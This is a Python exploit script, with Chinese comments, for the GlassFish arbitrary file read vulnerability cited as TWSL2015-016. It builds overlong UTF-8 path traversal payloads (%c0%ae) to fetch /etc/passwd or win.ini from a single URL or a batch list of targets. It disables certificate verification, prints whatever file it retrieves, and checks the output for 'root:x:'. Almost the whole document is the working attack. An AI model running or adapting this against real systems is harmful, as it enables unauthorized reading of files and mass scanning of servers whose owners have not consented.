import requests
import queue
q=queue.Queue()



#glassfish------任意文件读取
def gf_start():
    print('参考文章：https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904\n')
    cz = input('1-单个操作、2-批量操作\n#:')
    if cz == '1':
        url = input('\nURL:')
        while url=='':
            url = input('URL:')
        while not url.startswith('http//' and 'https://') :
            print('[-]Please include http:// or https:// in the URL!!')
            url = input('URL:')
            while url == '':
                url = input('URL:')
            if url.startswith('http://') or url.startswith('https://'):
                pass
        if url.endswith('/'):
            url_cd=len(url)
            url=url[0:url_cd-1]
        gf_fileread(url)
    else:
        if cz == '2':
            filename = input('Please enter the file name:\n')
            with open(filename) as f:
                for url in f:
                    url = url.replace('\n', '')
                    print(url)
                    gf_fileread(url)
def gf_fileread(url):
    os=input('\n1-Linux\n2-Windows\n#:')
    pd_l='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    pd_w='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36'
    }

    #get+linux
    if os=='1':
        zurl = url + pd_l
        try:
            requests.packages.urllib3.disable_warnings()
            data=requests.get(zurl,headers=headers,verify=False).text
            print(data)
        except Exception as a:
            print('error'+a)



    #get+windows
    if os=='2':
        zurl = url + pd_w
        try:
            requests.packages.urllib3.disable_warnings()
            data = requests.get(zurl, headers=headers, verify=False).text
            print(data)
        except Exception as a:
            print('error' + a)

    try:

        if "root:x:" in data:
            print('[+]漏洞存在')
        else:
            print('[-]漏洞不存在')
    except Exception as a:
        print('[!]发生错误', a)











